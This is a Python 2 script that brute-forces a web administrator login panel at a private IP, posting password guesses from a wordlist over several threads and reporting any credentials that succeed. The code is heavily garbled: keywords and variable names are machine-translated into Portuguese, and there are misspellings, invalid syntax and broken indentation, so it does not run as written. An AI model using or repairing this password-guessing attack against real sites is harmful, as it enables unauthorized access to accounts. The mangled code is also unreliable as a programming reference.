import  urllib2 
import  urllib
 cookielib de importação
 rosqueamento de importação
 sys de importação
 fila de importação

de  HTMLParser  import  HTMLParser

# Configurações Gerais
user_thread    =  10
nome de usuário       =  "admin"
wordlist_file  =  "/tmp/cain.txt"
resume         =  None

# segmentar configurações específicas
target_url     =  "http://192.168.112.131/administrator/index.php"
target_post    =  "http://192.168.112.131/administrator/index.php"

nomedeusuário_campo =  "nomedeusuário"
password_field =  "passwd"

success_check  =  "Administração - Painel de Controle"

class BruteParser(HTMLParser):
    
    def _init_(self):
        HTMLParser. initi(proprio)
        user.tag_results = {}
        
    def handle_starttag(self, tag, attrs):
        if tag == "input" :
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "nome":
                    tag_name = value
                if name == "valor":
                    tag_value = value
            
            if tag_name not for None:
                user.tag_results[tag_name] = valor
                

class bruter(obejct):
    def _init_(name, username, password):
        user_username = nome de usuario
        user_password_q = palavras
        user_encontrado = False
        
        print"Configuração concluida para; %s" % username
        
    def run_bruteforce (self):
        for i in range(user_thread):
            t = socket.Topico(target = sel.web_bruter)
            t.start()
            
    def web_bruter(self):
        
        while not user_password_q vazio () and not proprio find:
            bruto = user_password_q.get(), rstrip()
            jar = cookielib.fileCooklieJar("cookies")
            open = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            
            
            response = opener.open(target_url)
            page = resposta.read()
            print"Tentar:% s:% s (% d esquerda)"  % ( auto . nome de usuário , bruta , auto . password_q . qsize ())
            
            #analisar os campos ocultos 
            parser = BruteParser ()
            analyzer.feed(pagina)
            post_tags = analyzer.tag_results
            
            #adicione nossos campos de usuario e senha 
            
            post_tags [nome_do_usuario_campo] = proprio.nome do usuario
            post_tags [password_field] = bruto
            
            login_data = urllib.urlencode(post_tags)
            login_response = opened.open (target_post, login_data)
            
            login_result = login_response.read()
            
            if sucess_check in login_result:
                user.found = True
                
                print  "[*] Bruteforce com sucesso."
                print  "[*] Nome de usuário:% s"  %  nome de usuário
                print  "[*] Senha:% s"  %  brute
                print  "[*] Aguardando a saída de outros threads ..."
                
    def build_wordlist(arquivo de lista de palavras):
         #ler na lista de palavras
         fd = aberto(wordlist_file, "rb")
         raw_words = fd.readlines()
         fd.exit()
         
         found_resume = False
         words        = Queue.file()
         
         for palavras in raw_words:
             palavra = palavra.rstrip()
             
        if resumo not for Nenhum:
            
            if found_resume:
                palavras.index(palavra)
        elif:
            if word == resume:
                found_resume = True
                
                    print  "Reiniciando a lista de palavras de:% s"  %  resume
        elif: 
            palavras.index(palavra)
            
            return palavras
words = build_wordlist(arquivo de list de palavras)

bruter_obj = Bruter(username, password)
bruter_obj. runbruterforce()
